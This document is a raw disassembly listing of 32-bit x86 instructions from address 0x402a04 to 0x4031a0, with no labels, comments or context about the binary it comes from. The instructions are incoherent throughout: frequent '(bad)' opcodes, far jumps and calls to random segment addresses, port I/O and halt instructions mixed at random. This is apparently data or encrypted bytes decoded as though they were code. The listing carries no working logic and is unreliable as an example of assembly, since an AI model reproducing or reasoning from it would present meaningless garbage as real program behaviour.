  402a04:	mov    ebp,esp
  402a06:	pusha  
  402a07:	mov    ds:0x24e7e188,eax
  402a0c:	call   0xbe30:0x369a242b
  402a13:	pop    ebx
  402a14:	std    
  402a15:	xchg   BYTE PTR [ebp+0x15890da7],cl
  402a1b:	jns    0x402a93
  402a1d:	int    0x30
  402a1f:	out    0x4d,eax
  402a21:	sub    BYTE PTR [edx+0x22cb4347],cl
  402a27:	push   cs
  402a28:	out    dx,al
  402a29:	xor    esp,0x16
  402a2c:	cld    
  402a2d:	add    al,al
  402a2f:	aam    0xfa
  402a31:	push   0x7c
  402a33:	ins    BYTE PTR es:[edi],dx
  402a34:	jp     0x402a17
  402a36:	and    BYTE PTR [ebp-0x30d7552f],ah
  402a3c:	pop    ebp
  402a3d:	cmp    DWORD PTR [edi-0x25],edx
  402a40:	fadd   DWORD PTR [edx]
  402a42:	pop    ds
  402a43:	(bad)  
  402a44:	pop    edx
  402a45:	jmp    0xf4508e99
  402a4a:	into   
  402a4b:	adc    al,0xf
  402a4d:	jnp    0x402a76
  402a4f:	rcl    BYTE PTR [esi],1
  402a51:	sbb    BYTE PTR [ecx-0x46],al
  402a54:	packuswb mm3,QWORD PTR [edi+0x66]
  402a58:	mov    bl,0x88
  402a5a:	adc    eax,DWORD PTR [ebx]
  402a5c:	push   ds
  402a5d:	imul   esp,DWORD PTR [edi],0xffffffc0
  402a60:	xor    al,0xde
  402a62:	dec    edi
  402a63:	mov    dl,0x83
  402a65:	jg     0x402a97
  402a67:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402a68:	hlt    
  402a69:	add    al,0xc9
  402a6b:	neg    BYTE PTR [eax-0x1bab765f]
  402a71:	jmp    0x58ea:0x7dd5f92e
  402a78:	sub    eax,0x3cb186b
  402a7d:	(bad)  
  402a7e:	dec    esp
  402a7f:	mov    esi,0xc8ec8c28
  402a84:	jmp    0x402ab1
  402a86:	imul   ebp,ecx,0x2d4ab912
  402a8c:	xchg   ebp,eax
  402a8d:	das    
  402a8e:	jge    0x402b0f
  402a90:	out    dx,al
  402a91:	pop    ds
  402a92:	and    al,0xa3
  402a94:	jbe    0x402aa1
  402a96:	mov    ch,BYTE PTR [eax-0x66]
  402a99:	scas   al,BYTE PTR es:[edi]
  402a9a:	or     eax,0x979ad8ef
  402a9f:	bound  eax,QWORD PTR [edx-0x7c74ccfd]
  402aa5:	xor    BYTE PTR [edx],bl
  402aa7:	es inc ecx
  402aa9:	mov    al,ds:0x6536e944
  402aae:	inc    esp
  402aaf:	das    
  402ab0:	fdivr  DWORD PTR [esi+esi*1-0x3a]
  402ab4:	sub    eax,DWORD PTR [eax]
  402ab6:	xchg   esi,eax
  402ab7:	xor    al,0x2a
  402ab9:	sub    DWORD PTR [edx],edi
  402abb:	xor    DWORD PTR [esi-0x72],ebp
  402abe:	popa   
  402abf:	cmc    
  402ac0:	push   esp
  402ac1:	jge    0x402b0d
  402ac3:	mov    esp,0x5bdea8ed
  402ac8:	sub    al,0x6
  402aca:	stos   DWORD PTR es:[edi],eax
  402acb:	aas    
  402acc:	(bad)  
  402acd:	in     eax,0x3c
  402acf:	retf   0xb4b3
  402ad2:	push   esp
  402ad3:	jmp    0xb95d0eb4
  402ad8:	stc    
  402ad9:	scas   al,BYTE PTR es:[edi]
  402ada:	xchg   ecx,eax
  402adb:	test   BYTE PTR [ecx-0x6a495f28],ah
  402ae1:	pop    esp
  402ae2:	fnstenv [ecx]
  402ae4:	sbb    ebx,DWORD PTR [esi-0x12a95655]
  402aea:	ret    
  402aeb:	push   cs
  402aec:	mov    esi,0x15184537
  402af1:	xlat   BYTE PTR ds:[ebx]
  402af2:	shl    DWORD PTR [edi],0x49
  402af5:	lods   eax,DWORD PTR ds:[esi]
  402af6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402af7:	mov    ecx,DWORD PTR [ecx]
  402af9:	fisttp DWORD PTR [eax+0x4a]
  402afc:	outs   dx,DWORD PTR ds:[esi]
  402afd:	mov    dl,bh
  402aff:	inc    edx
  402b00:	jle    0x402b40
  402b02:	test   DWORD PTR [ecx+0x26000ce8],edx
  402b08:	sbb    esp,DWORD PTR [edx]
  402b0a:	rcr    BYTE PTR ds:0xb47fb763,0xf3
  402b11:	sub    BYTE PTR [ebp+eiz*4+0x1c3c785a],ah
  402b18:	mov    ebx,0x580ecff6
  402b1d:	test   eax,0x3427d681
  402b22:	arpl   WORD PTR ss:[ebp-0x75],di
  402b26:	push   0x2a0149da
  402b2b:	rcl    DWORD PTR [edi],0x44
  402b2e:	outs   dx,BYTE PTR ds:[esi]
  402b2f:	out    0x1a,eax
  402b31:	jns    0x402b8c
  402b33:	pusha  
  402b34:	hlt    
  402b35:	xchg   edi,eax
  402b36:	inc    ebx
  402b37:	dec    BYTE PTR [esi-0x3a053a62]
  402b3d:	mov    eax,0xfb4bbe43
  402b42:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402b43:	pop    ebp
  402b44:	cmp    BYTE PTR [edi+0x22705f],cl
  402b4a:	jg     0x402ae2
  402b4c:	cwde   
  402b4d:	sub    ah,BYTE PTR [esi+0x7c]
  402b50:	adc    edx,DWORD PTR [eax-0x59]
  402b53:	ror    bl,0x7f
  402b56:	int3   
  402b57:	push   esi
  402b58:	push   edx
  402b59:	xchg   ebp,eax
  402b5a:	pop    ds
  402b5b:	pop    ecx
  402b5c:	je     0x402b39
  402b5e:	mov    bh,0x4f
  402b60:	jecxz  0x402b84
  402b62:	xchg   ebx,eax
  402b63:	mov    ch,0x81
  402b65:	lock cwde 
  402b67:	dec    ebp
  402b68:	sbb    ch,cl
  402b6a:	loopne 0x402ba1
  402b6c:	adc    BYTE PTR [edx],bh
  402b6e:	xor    al,0xad
  402b70:	daa    
  402b71:	mov    esi,0xa182d4a3
  402b76:	adc    al,0x58
  402b78:	les    ebp,FWORD PTR [edx+0x5fd317b3]
  402b7e:	in     eax,0x52
  402b80:	cld    
  402b81:	sub    bh,BYTE PTR [eax]
  402b83:	push   0xffffffe6
  402b85:	jae    0x402b73
  402b87:	mov    ch,BYTE PTR [ecx+0x15526121]
  402b8d:	push   edx
  402b8e:	pushf  
  402b8f:	out    dx,al
  402b90:	sub    eax,0xfcc7fddf
  402b95:	pop    esi
  402b96:	les    ecx,FWORD PTR [edx]
  402b98:	pushf  
  402b99:	cdq    
  402b9a:	cwde   
  402b9b:	add    al,0x81
  402b9d:	call   0x868798f6
  402ba2:	cmp    al,0xe6
  402ba4:	xor    eax,DWORD PTR ds:0x99b116fc
  402baa:	fadd   DWORD PTR [edi-0x66]
  402bad:	sub    edx,0x117c12a2
  402bb3:	dec    eax
  402bb4:	test   ebp,ecx
  402bb6:	push   edx
  402bb7:	inc    ecx
  402bb8:	in     eax,0x21
  402bba:	add    eax,0xce14e7cf
  402bbf:	cld    
  402bc0:	inc    edx
  402bc1:	adc    BYTE PTR [ecx+edi*4-0x18],dl
  402bc5:	sub    eax,0x837edafb
  402bca:	mov    ch,0x5
  402bcc:	adc    DWORD PTR ds:0x6ef9dbbe,0x5a9d33a2
  402bd6:	fidivr DWORD PTR [edx-0x3c]
  402bd9:	lods   eax,DWORD PTR ds:[esi]
  402bda:	and    cl,al
  402bdc:	xor    BYTE PTR [ebx-0x7b162d9d],cl
  402be2:	shl    BYTE PTR [edx-0x60abdf72],cl
  402be8:	sub    BYTE PTR [ebx-0x48],ch
  402beb:	ds arpl dx,sp
  402bee:	int    0x19
  402bf0:	jmp    0x58e3:0xb6e1bf49
  402bf7:	inc    esp
  402bf8:	mov    BYTE PTR [eax],dl
  402bfa:	aas    
  402bfb:	cmc    
  402bfc:	sub    bh,BYTE PTR [esi+0x4cd3d0f9]
  402c02:	inc    ebx
  402c03:	cmp    al,0xd5
  402c05:	shl    DWORD PTR [eax+0xe],0x9b
  402c09:	inc    ecx
  402c0a:	mov    bl,0xe6
  402c0c:	repz sbb BYTE PTR [edi+0x10],bl
  402c10:	mov    dl,0xcc
  402c12:	iret   
  402c13:	leave  
  402c14:	(bad)  
  402c15:	jg     0x402bfd
  402c17:	pusha  
  402c18:	or     eax,0x72f6ec5c
  402c1d:	sahf   
  402c1e:	mov    gs,WORD PTR [esi]
  402c20:	jb     0x402bee
  402c22:	popf   
  402c23:	nop
  402c24:	xor    esp,DWORD PTR [ebx]
  402c26:	sar    eax,1
  402c28:	(bad)  
  402c29:	fcomp  QWORD PTR [edi-0x62]
  402c2c:	cmp    BYTE PTR [edx-0x550c1af7],ch
  402c32:	in     al,0xcc
  402c34:	sub    eax,0x49efd16d
  402c39:	stos   DWORD PTR es:[edi],eax
  402c3a:	dec    ebp
  402c3b:	retf   0x86f9
  402c3e:	shl    BYTE PTR [edi],1
  402c40:	ret    
  402c41:	sub    DWORD PTR ds:0x23920624,ebp
  402c47:	sbb    al,0xf9
  402c49:	inc    edx
  402c4a:	pop    ebx
  402c4b:	hlt    
  402c4c:	add    eax,0x962cb447
  402c51:	push   edx
  402c52:	dec    ebx
  402c53:	pop    ebx
  402c54:	xor    DWORD PTR [ebx-0x17990546],esi
  402c5a:	push   edx
  402c5b:	push   cs
  402c5c:	xchg   BYTE PTR [esp+ebx*4+0x62368b82],al
  402c63:	mov    dl,0xfa
  402c65:	stos   DWORD PTR es:[edi],eax
  402c66:	mov    cl,bh
  402c68:	stos   BYTE PTR es:[edi],al
  402c69:	push   edi
  402c6a:	iret   
  402c6b:	(bad)  
  402c6c:	jnp    0x402c51
  402c6e:	jno    0x402cda
  402c70:	(bad)  
  402c71:	or     al,0xa5
  402c73:	stos   BYTE PTR es:[edi],al
  402c74:	cmc    
  402c75:	pop    ss
  402c76:	and    bh,cl
  402c78:	repz (bad) 
  402c7a:	and    eax,esp
  402c7c:	test   BYTE PTR [eax-0x41],0xdd
  402c80:	call   0x9659:0x85934ee4
  402c87:	push   ebx
  402c88:	pop    ds
  402c89:	xchg   ebp,eax
  402c8a:	adc    BYTE PTR [edi+eiz*2-0x34],cl
  402c8e:	loopne 0x402c22
  402c90:	loope  0x402c2e
  402c92:	pop    ecx
  402c93:	addr16 mov bp,0x5fc7
  402c98:	inc    eax
  402c99:	call   DWORD PTR [esp+eax*4+0x7e]
  402c9d:	mov    ch,0xb
  402c9f:	xchg   BYTE PTR [edi+0x27],dl
  402ca2:	not    BYTE PTR [edi-0x18]
  402ca5:	push   cs
  402ca6:	rcr    DWORD PTR [esi+0x6a],1
  402ca9:	push   ebp
  402caa:	repnz pop eax
  402cac:	pop    ds
  402cad:	mov    ah,0x34
  402caf:	(bad)  
  402cb0:	in     eax,0x64
  402cb2:	fisub  WORD PTR [edx-0x31]
  402cb5:	xlat   BYTE PTR ds:[ebx]
  402cb6:	ret    
  402cb7:	fstp   DWORD PTR [esp+ecx*2+0x41381fe2]
  402cbe:	retf   0x164c
  402cc1:	mov    edi,0x78ec4c47
  402cc6:	fcomp  st(4)
  402cc8:	in     eax,dx
  402cc9:	xchg   ecx,eax
  402cca:	(bad)
  402ccd:	pop    edx
  402cce:	adc    DWORD PTR ds:0x3220b04d,edi
  402cd4:	mov    dh,BYTE PTR [ecx+edi*4+0x4e3b8c98]
  402cdb:	sub    DWORD PTR [edi+0x546c970c],edx
  402ce1:	gs cdq 
  402ce3:	repz jo 0x402ca7
  402ce6:	and    BYTE PTR [eax+edi*4],bh
  402ce9:	pop    ebx
  402cea:	sahf   
  402ceb:	or     esi,DWORD PTR [ebx]
  402ced:	call   0xed8b59fe
  402cf2:	pop    esp
  402cf3:	mov    bl,0xb1
  402cf5:	or     BYTE PTR [ecx+ebx*1],0x1f
  402cf9:	or     al,0x3f
  402cfb:	xor    dl,BYTE PTR [edx-0x6a]
  402cfe:	mov    ds:0x4d885331,eax
  402d03:	jmp    0x2358:0x3ee0d156
  402d0a:	cmp    DWORD PTR [edx-0x6835be13],0xffffff80
  402d11:	ficom  WORD PTR [ecx+0x5913c5b]
  402d17:	cmp    esi,esi
  402d19:	lods   al,BYTE PTR ds:[esi]
  402d1a:	fstp   TBYTE PTR [edi]
  402d1c:	pop    ebx
  402d1d:	sbb    BYTE PTR [ecx-0x2c],dl
  402d20:	fwait
  402d21:	iret   
  402d22:	rcl    BYTE PTR [ebp+0x43],1
  402d25:	lds    edi,FWORD PTR [edi-0x29]
  402d28:	pushf  
  402d29:	(bad)  
  402d2a:	sbb    BYTE PTR [eax+0x4b8a66af],dl
  402d30:	mov    DWORD PTR [edi-0x3e],ecx
  402d33:	lods   eax,DWORD PTR gs:[esi]
  402d35:	pop    es
  402d36:	(bad)  
  402d37:	stos   BYTE PTR es:[edi],al
  402d38:	rcl    DWORD PTR [eax-0x2b339850],1
  402d3e:	inc    ebx
  402d3f:	sub    ebx,DWORD PTR [ecx+0x44fab315]
  402d45:	arpl   WORD PTR [edi-0x39918ac5],ax
  402d4b:	xchg   ecx,eax
  402d4c:	in     eax,0xfb
  402d4e:	les    edx,FWORD PTR [edi]
  402d50:	not    BYTE PTR [ecx]
  402d52:	sbb    ah,BYTE PTR ds:0xab01be26
  402d58:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402d59:	jge    0x402d0d
  402d5b:	or     ecx,DWORD PTR [esi-0x424a7256]
  402d61:	idiv   DWORD PTR [ebx+0x78dda826]
  402d67:	and    eax,ecx
  402d69:	jbe    0x402d34
  402d6b:	adc    bl,BYTE PTR [esi+0x77fc4fdc]
  402d71:	and    ecx,ebx
  402d73:	je     0x402cfb
  402d75:	jmp    0xdc09:0x9be3b948
  402d7c:	inc    esp
  402d7d:	fs leave 
  402d7f:	pop    esp
  402d80:	test   BYTE PTR [ebp+ebp*4+0x1b],dh
  402d84:	adc    al,0x3a
  402d86:	(bad)  
  402d88:	cmp    ecx,DWORD PTR [si]
  402d8b:	pcmpgtd mm7,QWORD PTR [edi]
  402d8e:	jge    0x402d39
  402d90:	add    ebp,DWORD PTR [ebp-0x59]
  402d93:	fwait
  402d94:	es adc eax,0x4431b586
  402d9a:	and    DWORD PTR [edx+0x53],0x3a
  402d9e:	pop    ecx
  402d9f:	shl    al,1
  402da1:	js     0x402d6d
  402da3:	inc    esp
  402da4:	sub    BYTE PTR [edi],0x78
  402da7:	rcl    dh,cl
  402da9:	in     al,0x6a
  402dab:	sar    BYTE PTR [ecx-0x1b],1
  402dae:	or     ch,BYTE PTR [ebx]
  402db0:	mov    cl,0x2b
  402db2:	sub    esp,0x41
  402db5:	mov    ecx,0xb75b19c4
  402dba:	mov    ebx,DWORD PTR [edx+esi*1+0x2f9e45c4]
  402dc1:	loop   0x402d4f
  402dc3:	push   cs
  402dc4:	lock cwde 
  402dc6:	mov    al,0x5e
  402dc8:	mov    dl,0x19
  402dca:	nop
  402dcb:	jl     0x402db4
  402dcd:	in     eax,dx
  402dce:	add    bl,BYTE PTR [eax-0x15fdfd7a]
  402dd4:	adc    bh,BYTE PTR [ebx-0x3b]
  402dd7:	pop    ecx
  402dd8:	mov    dh,0x3a
  402dda:	sbb    ah,bl
  402ddc:	lods   al,BYTE PTR ds:[esi]
  402ddd:	aam    0xa1
  402ddf:	ret    
  402de0:	add    bl,BYTE PTR [ebx-0x7a]
  402de3:	sbb    eax,edi
  402de5:	push   ds
  402de6:	minps  xmm7,XMMWORD PTR [edx]
  402de9:	cmp    DWORD PTR [edx+0x2b39c03a],0x4f
  402df0:	cmp    ebx,DWORD PTR [ecx]
  402df2:	imul   edx,DWORD PTR [ebx+edx*8-0x428f01ee],0x4fec87b3
  402dfd:	sub    eax,0x4f8a02de
  402e02:	push   ebp
  402e04:	loopne 0x402e72
  402e06:	pop    esp
  402e07:	stc    
  402e08:	ret    
  402e09:	in     eax,0x5d
  402e0b:	add    ebp,edx
  402e0d:	int    0x34
  402e0f:	pop    esi
  402e10:	mov    esi,edx
  402e12:	mov    cl,0x35
  402e14:	xchg   ebp,eax
  402e15:	xchg   esi,eax
  402e16:	lods   al,BYTE PTR ds:[esi]
  402e17:	sar    DWORD PTR [ebp-0x4b4e5119],0x99
  402e1e:	push   ebp
  402e1f:	sbb    BYTE PTR [esi-0x5],bl
  402e22:	loopne 0x402df9
  402e24:	hlt    
  402e25:	or     bl,dl
  402e27:	(bad)  
  402e28:	xchg   ecx,eax
  402e29:	mov    ds:0xc6556c6b,al
  402e2e:	jno    0x402dd7
  402e30:	sbb    bl,bl
  402e32:	jg     0x402e46
  402e34:	mov    ch,0xee
  402e36:	sub    ebp,ebp
  402e38:	mov    esi,0x8412a0f2
  402e3d:	out    dx,eax
  402e3e:	jmp    0x5cb:0xad88f8c5
  402e45:	sbb    cl,BYTE PTR cs:[edx-0x74d7f1c]
  402e4c:	mov    bl,0x1c
  402e4e:	cmp    al,BYTE PTR [eax]
  402e50:	(bad)  
  402e51:	sub    ebx,ebp
  402e53:	clc    
  402e54:	ror    BYTE PTR [esp+esi*8-0x790cc635],cl
  402e5b:	iret   
  402e5c:	rol    dl,cl
  402e5e:	js     0x402ed2
  402e60:	sti    
  402e61:	pushf  
  402e62:	in     eax,0x7e
  402e64:	ja     0x402ec1
  402e66:	sti    
  402e67:	sbb    eax,0x29329c5d
  402e6c:	jo     0x402ee4
  402e6e:	xor    DWORD PTR [esi],edx
  402e70:	mov    ebx,0x62b4b969
  402e75:	adc    eax,0xe7449bc7
  402e7a:	jg     0x402e08
  402e7c:	dec    edi
  402e7d:	xchg   ebx,eax
  402e7e:	hlt    
  402e7f:	xchg   esi,eax
  402e80:	dec    edi
  402e81:	sbb    eax,0x28df4a67
  402e86:	xchg   esp,eax
  402e87:	cwde   
  402e88:	jle    0x402e23
  402e8a:	pushf  
  402e8b:	sbb    eax,0x79e13a46
  402e90:	call   0xaec9:0xe29b8ed7
  402e97:	xor    eax,0xd57cfa71
  402e9c:	sub    al,0x1d
  402e9e:	and    ch,bl
  402ea0:	test   eax,0x8002915d
  402ea5:	mov    dl,BYTE PTR [ebp+0x51b6268d]
  402eab:	clc    
  402eac:	mov    dh,0xd
  402eae:	xor    ch,BYTE PTR [ebx]
  402eb0:	cmp    eax,0x1d23e9f5
  402eb5:	jbe    0x402e54
  402eb7:	pop    ss
  402eb8:	test   al,0xce
  402eba:	jno    0x402e8c
  402ebc:	int    0x62
  402ebe:	int3   
  402ebf:	push   edx
  402ec0:	xchg   ebx,eax
  402ec1:	adc    ch,dh
  402ec3:	mov    eax,ds:0xbfe24c21
  402ec8:	or     DWORD PTR [edi-0x59],eax
  402ecb:	xchg   edx,eax
  402ecc:	jb     0x402f3f
  402ece:	in     al,0xa6
  402ed0:	xlat   BYTE PTR ds:[ebx]
  402ed1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402ed2:	lahf   
  402ed3:	push   eax
  402ed4:	ss sahf 
  402ed6:	mov    dl,0x27
  402ed8:	scas   al,BYTE PTR es:[edi]
  402ed9:	in     eax,dx
  402eda:	push   ss
  402edb:	(bad)  [ecx]
  402edd:	or     BYTE PTR [eax-0x203a3ddf],0xa5
  402ee4:	sbb    esi,DWORD PTR [edx+ebp*8]
  402ee7:	mov    ch,0xa2
  402ee9:	push   ss
  402eea:	fdivr  st,st(7)
  402eec:	jns    0x402f2f
  402eee:	xchg   ebp,eax
  402eef:	mov    ah,cl
  402ef1:	mov    eax,ds:0xfebbbaad
  402ef6:	cs inc edi
  402ef8:	pop    ecx
  402ef9:	jne    0x402ede
  402efb:	jbe    0x402f73
  402efd:	xchg   esi,eax
  402efe:	inc    edx
  402eff:	mov    cl,0xfb
  402f01:	xchg   DWORD PTR [edi],edi
  402f03:	gs jle 0x402ed5
  402f06:	pop    ebx
  402f07:	fcmovu st,st(2)
  402f09:	popf   
  402f0a:	mov    dh,0x12
  402f0c:	(bad)  
  402f0d:	test   al,0xea
  402f0f:	in     eax,dx
  402f10:	xchg   dl,cl
  402f12:	fdivp  st(5),st
  402f14:	push   ecx
  402f15:	(bad)  
  402f16:	neg    BYTE PTR [ebx-0x7a]
  402f19:	shr    dl,1
  402f1b:	ret    0xc7db
  402f1e:	hlt    
  402f1f:	subps  xmm6,XMMWORD PTR [edi]
  402f22:	test   DWORD PTR [edi-0x1b39cc82],esp
  402f28:	(bad)  
  402f29:	outs   dx,BYTE PTR ds:[esi]
  402f2a:	xchg   DWORD PTR ds:0x8285b6cd,eax
  402f30:	jge    0x402f43
  402f32:	dec    edx
  402f33:	je     0x402ed7
  402f35:	ins    DWORD PTR es:[edi],dx
  402f36:	(bad)  
  402f37:	cmp    DWORD PTR [ecx-0x1f],edi
  402f3a:	popf   
  402f3b:	and    al,BYTE PTR [ecx+0x73]
  402f3e:	test   eax,0x4d85f4d5
  402f43:	cmp    BYTE PTR [ecx-0x3b45bc48],dh
  402f49:	mov    ecx,DWORD PTR ds:0x3983698c
  402f4f:	addr16 es xchg ebx,eax
  402f52:	(bad)  
  402f53:	mov    ch,0x45
  402f55:	add    eax,0x32e828e0
  402f5a:	xchg   edx,eax
  402f5b:	ror    DWORD PTR [eax-0x1ec210f6],1
  402f61:	fldcw  WORD PTR [edi-0x43]
  402f64:	inc    edx
  402f65:	mov    dl,0xef
  402f67:	pop    edx
  402f68:	repz fnstenv [esi-0x67]
  402f6c:	add    DWORD PTR [edx-0x6f4e1d31],edi
  402f72:	lea    esi,[eax-0x18]
  402f75:	(bad)  
  402f76:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402f77:	inc    ebx
  402f78:	sbb    al,0x9a
  402f7a:	ins    BYTE PTR es:[edi],dx
  402f7b:	mov    esp,0x7fdda8a5
  402f80:	in     eax,0xf1
  402f82:	mov    ebp,0x77d0a116
  402f87:	repz stc 
  402f89:	jne    0x402fdb
  402f8b:	shr    edx,cl
  402f8d:	push   edx
  402f8e:	mov    ah,0xfc
  402f90:	fisubr WORD PTR [ecx]
  402f92:	xchg   DWORD PTR [ebx+0x5f],esi
  402f95:	fs in  al,dx
  402f97:	mov    DWORD PTR [ecx+0x68],edx
  402f9a:	into   
  402f9b:	repnz popf 
  402f9d:	inc    edx
  402f9e:	and    al,0x95
  402fa0:	mov    dl,0x5e
  402fa2:	out    0x17,al
  402fa4:	(bad)  
  402fa5:	jp     0x402f33
  402fa7:	out    dx,al
  402fa8:	icebp  
  402fa9:	(bad)  
  402faa:	ins    DWORD PTR es:[edi],dx
  402fab:	add    cl,cl
  402fad:	sub    DWORD PTR [ecx-0x4a],ecx
  402fb0:	dec    esi
  402fb1:	cmp    al,0x91
  402fb3:	out    0x5c,al
  402fb5:	into   
  402fb6:	fldlg2 
  402fb8:	pop    ebp
  402fb9:	out    0xbe,al
  402fbb:	test   ebx,edi
  402fbd:	add    cl,BYTE PTR [edi]
  402fbf:	sub    al,0xca
  402fc1:	fild   QWORD PTR [eax+0x7d2abd28]
  402fc7:	push   esi
  402fc8:	hlt    
  402fc9:	es jle 0x40302a
  402fcc:	and    eax,DWORD PTR [esi]
  402fce:	addr16 push 0x792549b2
  402fd4:	pop    es
  402fd5:	dec    esp
  402fd6:	or     DWORD PTR [eax],esp
  402fd8:	es clc 
  402fda:	push   0x60295039
  402fdf:	xchg   ecx,eax
  402fe0:	cmp    eax,0x6c03bd9d
  402fe5:	repz push ss
  402fe7:	jmp    0xa7f8a51e
  402fec:	ja     0x402fa2
  402fee:	jecxz  0x402fba
  402ff0:	push   esi
  402ff1:	xor    ebp,DWORD PTR [ebp+0x70cff6ab]
  402ff7:	mov    ecx,0xd40de755
  402ffc:	xchg   ebx,eax
  402ffd:	(bad)  
  402ffe:	fsubr  DWORD PTR [ecx+eiz*2]
  403001:	lods   eax,DWORD PTR ds:[esi]
  403002:	test   al,0xe1
  403004:	xor    BYTE PTR [ecx],dl
  403006:	bound  edx,QWORD PTR cs:[ebx]
  403009:	outs   dx,DWORD PTR ds:[esi]
  40300a:	rcl    BYTE PTR [eax+0x1e9b37e1],1
  403010:	cmp    al,0x28
  403012:	aad    0x1b
  403014:	or     eax,DWORD PTR [edx+0x60ac0e12]
  40301a:	es mov ebp,0x5668ae41
  403020:	pop    esp
  403021:	call   0x1247822f
  403026:	inc    ecx
  403027:	pusha  
  403028:	sub    BYTE PTR [eax-0xf],ah
  40302b:	std    
  40302c:	(bad)  
  40302d:	pop    ss
  40302e:	ins    DWORD PTR es:[edi],dx
  40302f:	push   eax
  403030:	mov    ah,0xf6
  403032:	jne    0x4030a3
  403034:	in     eax,0x9f
  403036:	das    
  403037:	adc    eax,DWORD PTR [ebx]
  403039:	sub    DWORD PTR [ebp+0x42aa4777],esi
  40303f:	fsubp  st(2),st
  403041:	push   esp
  403042:	cmp    ebx,DWORD PTR ds:0x3ef588de
  403048:	jns    0x40302c
  40304a:	xlat   BYTE PTR ds:[ebx]
  40304b:	adc    bl,BYTE PTR [ebx+0x7a]
  40304e:	scas   al,BYTE PTR es:[edi]
  40304f:	push   es
  403050:	inc    esp
  403051:	xchg   edx,eax
  403052:	daa    
  403053:	add    ecx,DWORD PTR [esi+0x734d344c]
  403059:	call   FWORD PTR [ecx+esi*4-0xf]
  40305d:	sbb    bh,al
  40305f:	inc    esp
  403060:	int3   
  403061:	fdiv   st(6),st
  403063:	lods   eax,DWORD PTR ds:[esi]
  403064:	sbb    eax,0xdc1d7746
  403069:	adc    al,0x6b
  40306b:	add    BYTE PTR [ecx+0x1c3a0f16],ah
  403071:	xor    ebx,DWORD PTR [ebx]
  403073:	dec    eax
  403074:	jbe    0x403075
  403076:	inc    edi
  403077:	dec    eax
  403078:	add    edx,edx
  40307a:	mov    al,0xe1
  40307c:	gs inc ebp
  40307e:	xchg   edi,eax
  40307f:	dec    esi
  403080:	das    
  403081:	pop    ss
  403082:	les    edx,FWORD PTR [eax]
  403084:	xor    DWORD PTR [eax-0x7331a7ff],edx
  40308a:	scas   eax,DWORD PTR es:[edi]
  40308b:	jge    0x403036
  40308d:	je     0x4030f2
  40308f:	repz cmp eax,0x145ec0dc
  403095:	cmp    bh,al
  403097:	jb     0x4030e0
  403099:	pusha  
  40309a:	mov    ebx,0x7a63d4f7
  40309f:	adc    BYTE PTR [eax-0x5098ff99],0xea
  4030a6:	inc    edi
  4030a7:	mov    cl,0x41
  4030a9:	fmul   QWORD PTR [edx+0x5117a985]
  4030af:	jmp    0x631e:0xd94e83e3
  4030b6:	inc    eax
  4030b7:	imul   edi,DWORD PTR ds:0x12d52d09,0x21dcf720
  4030c1:	out    dx,eax
  4030c2:	inc    ebp
  4030c3:	add    eax,0xe157d329
  4030c8:	in     eax,0xed
  4030ca:	addr16 xchg edx,eax
  4030cc:	mov    dl,0x6c
  4030ce:	popf   
  4030cf:	push   esp
  4030d0:	and    ebp,DWORD PTR [ebx+0x2b71a6c4]
  4030d6:	loopne 0x4030d5
  4030d8:	cmc    
  4030d9:	das    
  4030da:	inc    esi
  4030db:	imul   eax,DWORD PTR [ecx-0x1006b4bd],0x30a5a5ae
  4030e5:	cld    
  4030e6:	mov    edi,0x846888c3
  4030eb:	jg     0x403118
  4030ed:	or     al,bl
  4030ef:	call   0xb6a5bdca
  4030f4:	retf   
  4030f5:	ins    DWORD PTR es:[edi],dx
  4030f6:	and    al,0x30
  4030f8:	jae    0x4030ac
  4030fa:	loopne 0x4030c2
  4030fc:	push   eax
  4030fd:	and    al,BYTE PTR [esi+0x47efa559]
  403103:	sbb    eax,0x880d6380
  403108:	pop    ss
  403109:	icebp  
  40310a:	mov    esi,0x75717dc2
  40310f:	add    dl,BYTE PTR [ebp+0x1c]
  403112:	or     al,0x9a
  403114:	sbb    eax,0xc7e950dd
  403119:	xor    al,0x7e
  40311b:	lea    esp,[edx]
  40311d:	lea    esp,[ebx]
  40311f:	jne    0x40313a
  403121:	inc    ebp
  403122:	or     BYTE PTR [edi],al
  403124:	mov    ecx,0xd8a484de
  403129:	cld    
  40312a:	inc    ebx
  40312b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40312c:	sbb    cl,BYTE PTR [ebp+0x3325a1fe]
  403132:	shl    BYTE PTR ds:0x6ff2537f,0xb2
  403139:	pop    esp
  40313a:	dec    esi
  40313b:	int    0x56
  40313d:	sub    DWORD PTR [edi],eax
  40313f:	adc    esi,DWORD PTR ss:[edi+eax*4]
  403143:	aad    0x84
  403145:	int    0xe
  403147:	mov    ch,0xb9
  403149:	mov    esi,0xca5fc871
  40314e:	lods   al,BYTE PTR ds:[esi]
  40314f:	out    0x1c,al
  403151:	sub    edi,ecx
  403153:	fsubr  QWORD PTR [ecx]
  403155:	jp     0x40317e
  403157:	pop    ds
  403158:	std    
  403159:	add    DWORD PTR [eax],ebx
  40315b:	in     al,dx
  40315c:	hlt    
  40315d:	xor    dh,BYTE PTR [eax-0x63]
  403160:	lods   eax,DWORD PTR ds:[esi]
  403161:	hlt    
  403162:	dec    esp
  403163:	xlat   BYTE PTR ds:[ebx]
  403164:	pop    es
  403165:	mov    dh,0x21
  403167:	into   
  403168:	inc    ebp
  403169:	imul   edx,DWORD PTR ds:0xbc9d1d36,0x7a
  403170:	sbb    BYTE PTR [esi-0x56],0x31
  403174:	pushf  
  403175:	jecxz  0x4031d6
  403177:	mov    cl,0xf7
  403179:	push   cs
  40317a:	pop    ds
  40317b:	adc    DWORD PTR [ecx],0xfc4097b4
  403181:	inc    esi
  403182:	lods   al,BYTE PTR ds:[esi]
  403183:	(bad)  
  403184:	pop    DWORD PTR [ebp+0x1ce01fcc]
  40318a:	and    BYTE PTR [esi],al
  40318c:	sub    bl,al
  40318e:	xchg   ebx,eax
  40318f:	arpl   WORD PTR [edi],dx
  403191:	sub    BYTE PTR [edx-0x7d5ed6d2],cl
  403197:	pop    esp
  403198:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403199:	ins    BYTE PTR es:[edi],dx
  40319a:	sbb    eax,0xf25dbeb3
  40319f:	nop
  4031a0:	mov    eax,0x6d1f453d
